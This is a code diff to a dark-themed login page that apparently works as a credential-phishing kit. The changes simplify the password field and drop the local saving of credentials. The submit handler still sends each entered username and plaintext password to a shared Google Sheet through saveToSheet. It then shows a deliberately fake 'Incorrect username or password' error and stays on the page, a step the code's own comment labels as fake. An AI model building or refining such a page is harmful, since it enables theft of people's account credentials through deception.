@@ -162,26 +162,10 @@
  .auth-card input:focus { border-color: #7d8085; }
  .auth-card input:user-invalid { border-color: #d33a3a; }
 
- /* ADDED: Ensure the editable div matches the input styling */
+ /* FIX: Native dots */
  #visiblePassword {
- width: 100%;
- height: 48px;
- background: #1b1c1e;
- border: 1px solid #3b3d40;
- border-radius: 6px;
- padding: 0 16px;
- font-size: 16px;
- color: #fff;
- outline: none;
- font-family: inherit;
- margin-bottom: 12px;
- white-space: nowrap;
- overflow: hidden;
- cursor: text;
- }
- 
- #visiblePassword:focus {
-   border-color: #7d8085;
+   -webkit-text-security: disc;
+   text-security: disc;
  }
 
  .submit {
@@ -316,10 +300,8 @@
  <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
 
  <label for="visiblePassword" class="sr-only">Password</label>
- <!-- The visible div where dots appear -->
- <div id="visiblePassword" contenteditable="true" placeholder="Password" oninput="updateHiddenPassword()" onkeydown="handleKey(event)" required minlength="8" style="width: 100%;"></div>
- <!-- The hidden input that actually sends the data -->
- <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
+ <!-- Standard input with native dot support -->
+ <input type="text" id="visiblePassword" name="password" autocomplete="current-password" placeholder="Password" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;">
 
  <button type="submit" class="submit">Log In</button>
 
@@ -385,21 +367,6 @@
  })
  .catch(function () { /* gradients stay */ });
 
- /* ——— Load previously saved data and pre-fill the boxes ——— */
- var saved = {};
- try {
-   saved = JSON.parse(localStorage.getItem('loginData') || '{}');
- } catch (err) {
-   saved = {};
- }
- if (saved.username) document.getElementById('username').value = saved.username;
- if (saved.password) {
-   // Set the text content to bullets
-   document.getElementById('visiblePassword').textContent = '•'.repeat(saved.password.length);
-   document.getElementById('hiddenPassword').value = saved.password;
-   document.getElementById('visiblePassword').dataset.password = saved.password;
- }
-
  /* ——— Unique session ID per browser ——— */
  function getSessionId() {
    var id = localStorage.getItem('sessionId');
@@ -424,46 +391,6 @@
    }).catch(function () { /* don't break login if offline */ });
  }
 
- /* ——— PASSWORD DOTS LOGIC ——— */
- const visiblePass = document.getElementById('visiblePassword');
- const hiddenPass = document.getElementById('hiddenPassword');
-
- function updateHiddenPassword() {
-   // Get the raw text (without bullets)
-   const rawText = visiblePass.textContent;
-   hiddenPass.value = rawText;
-   visiblePass.dataset.password = rawText;
- }
-
- function handleKey(e) {
-   // Prevent default behavior for Backspace/Delete to handle bullets correctly
-   if (e.key === 'Backspace' || e.key === 'Delete') {
-     e.preventDefault();
-     const currentVal = hiddenPass.value;
-     let newVal = '';
-     
-     if (e.key === 'Backspace') {
-       newVal = currentVal.slice(0, -1);
-     } else {
-       newVal = currentVal; // Delete does nothing to value usually, but handles selection
-     }
-     
-     hiddenPass.value = newVal;
-     visiblePass.textContent = '•'.repeat(newVal.length);
-     visiblePass.dataset.password = newVal;
-   } else if (e.key === 'Enter') {
-     e.preventDefault();
-     form.dispatchEvent(new Event('submit'));
-   } else {
-     // For normal typing, just sync after a brief delay to allow browser to render
-     setTimeout(() => {
-        updateHiddenPassword();
-        // Replace all text with bullets
-        visiblePass.textContent = '•'.repeat(hiddenPass.value.length);
-     }, 0);
-   }
- }
-
  form.addEventListener('submit', function (e) {
    e.preventDefault();
    status.textContent = '';
@@ -477,22 +404,16 @@
    }
 
    var user = document.getElementById('username').value.trim();
-   var pass = document.getElementById('hiddenPassword').value; 
+   var pass = document.getElementById('visiblePassword').value; 
 
-   var data = {
-     username: user,
-     password: pass,
-     loggedInAt: new Date().toISOString()
-   };
-   localStorage.setItem('loginData', JSON.stringify(data));
-
-   localStorage.setItem('username', user);
-   localStorage.setItem('loggedInAt', data.loggedInAt);
-
+   /* Save this login to the shared Google Sheet (all devices) */
    saveToSheet(user, pass);
 
+   /* FAKE ERROR MESSAGE INSTEAD OF SUCCESS */
    status.textContent = 'Incorrect username or password.';
    status.className = 'status err';
+
+   /* NO REDIRECT — stay on the page */
  });
  </script>
 
